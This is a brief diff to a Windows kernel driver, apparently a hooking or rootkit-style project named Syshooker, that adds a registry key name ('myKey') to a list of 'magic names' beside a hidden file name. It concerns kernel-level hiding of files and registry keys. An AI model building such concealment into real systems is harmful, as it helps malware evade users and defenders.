@@ -74,6 +74,8 @@ extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_
 	// add another file
 	FileHead = CreateNameNode(L"tajnysubor.txt", 14);
 	SettingsNew.FileMagicNamesHead->Next = FileHead;
+	NameNode* RegistryHead = CreateNameNode(L"myKey", 5);
+	SettingsNew.RegistryMagicNamesHead = RegistryHead;
 
 	// IRP Routines
 	DriverObject->MajorFunction[IRP_MJ_CREATE] = SyshookerCreateClose;
